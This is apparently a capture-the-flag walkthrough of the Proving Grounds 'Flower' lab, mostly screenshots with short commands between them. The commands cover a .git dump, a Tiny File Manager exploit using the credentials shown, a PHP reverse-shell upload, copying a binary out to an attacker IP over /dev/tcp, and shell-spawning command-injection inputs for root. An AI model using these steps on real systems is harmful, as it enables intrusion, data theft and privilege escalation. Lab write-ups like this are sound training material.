---
title: Flower
date: 2026-05-16T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - linpeas
  - git
  - hashcat
  - python
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Flower"
---
There is no patch for stupidity.  
― Kevin Mitnick

![](Screenshot%202026-05-14%20at%2013.34.48.png)

![](Screenshot%202026-05-14%20at%2013.39.48.png)

Gobuster:

![](Screenshot%202026-05-20%20at%2008.57.07.png)

`gobuster dir -u http://flower.pg  -w /usr/share/wordlists/dirb/common.txt`

Nothing...

![](Screenshot%202026-05-20%20at%2008.59.55.png)

`ffuf -u http://FUZZ.flower.pg -w /usr/share/wordlists/dirb/common.txt`

![](Screenshot%202026-05-20%20at%2009.03.48.png)

`http://files.flower.pg`

![](Screenshot%202026-05-14%20at%2013.53.19.png)

![](Screenshot%202026-05-20%20at%2009.05.03.png)


![](Screenshot%202026-05-20%20at%2009.05.31.png)

After having a good poke around I decided to use gittools...  
https://github.com/internetwache/GitTools

Clone and dump the repo:  
`./gitdumper.sh http://files.flower.pg/.git/ ~/oscp/linux/flower/git`

`cd .git`  
`ls -lah`

![](Screenshot%202026-05-20%20at%2009.08.47.png)


![](Screenshot%202026-05-14%20at%2012.33.40.png)

![](Screenshot%202026-05-14%20at%2012.32.55.png)

![](Screenshot%202026-05-20%20at%2009.12.41.png)

![](Screenshot%202026-05-14%20at%2012.37.27.png)

![](Screenshot%202026-05-14%20at%2013.02.37.png)

![](Screenshot%202026-05-14%20at%2013.21.02.png)

![](Screenshot%202026-05-14%20at%2013.01.26.png)

![](Screenshot%202026-05-14%20at%2013.20.36.png)

![](Screenshot%202026-05-14%20at%2013.54.27.png)

![](Screenshot%202026-05-20%20at%2014.16.14.png)

/bin/bash 50828.sh   http://files.flower.pg/tinyfilemanager.php admin myspace4

![](Screenshot%202026-05-14%20at%2014.54.07.png)

The reason I am using `/bin/bash` instead of `./` is that there are specific features in this script that require `bash`, whereas Kali uses the `dash` natively. Dash is faster and more secure but far less feature rich. 

Oops..... I was struggling to get a working shell so I uploaded a php reverse shell to the home directory of the www.data user using the file manager. 

Revshells...

![](Screenshot%202026-05-20%20at%2012.48.17.png)

![](Screenshot%202026-05-20%20at%2011.21.07.png)

Navigate to the webpage:

![](Screenshot%202026-05-20%20at%2014.17.37.png)

Upgrade the shell:  
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![](Screenshot%202026-05-20%20at%2012.47.40.png)

I've been using this for manual enumeration....   
https://cyberlab.pacific.edu/resources/linux-enumeration-cheat-sheet

`find / -perm -u=s 2>/dev/null`  

![](Screenshot%202026-05-20%20at%2012.52.16.png)

`ls -lah /usr/local/bin/db-backup`

![](Screenshot%202026-05-20%20at%2012.53.47.png)


Extract the binary.

Victim: cat /usr/local/bin/db-backup > /dev/tcp/192.168.45.200/443  
Kali: rlwrap nc -lvnp443 > db-backup

![](Screenshot%202026-05-20%20at%2013.01.54.png)

Open in Ghidra:

![](Screenshot%202026-05-14%20at%2016.05.55.png)

![](Screenshot%202026-05-14%20at%2016.07.03.png)

`ssh lucienne@192.168.112.213`   
`svc-dev2019P4SSw0Rd`

![](Screenshot%202026-05-14%20at%2016.32.16.png)

There is a command injection vulnerablility here:

![](Screenshot%202026-05-20%20at%2013.21.28.png)

Run the backup binary... Then run again to get to the input. Anything after the 3 available bits allocated will be written to the stack, giving us a shell.
	
![](Screenshot%202026-05-20%20at%2013.16.10.png)

![](Screenshot%202026-05-20%20at%2013.55.06.png)

Will work:
$(/bin/bash) 
/bin/sh -p
/bin/sh -c
/bin/bash -c

Wont work:
/bin/bash -p

Interestingly... 
$(command) = /bin/sh -c command

So, 
$(/bin/bash) = /bin/sh -c /bin/bash

![](Screenshot%202026-05-20%20at%2014.08.47.png)
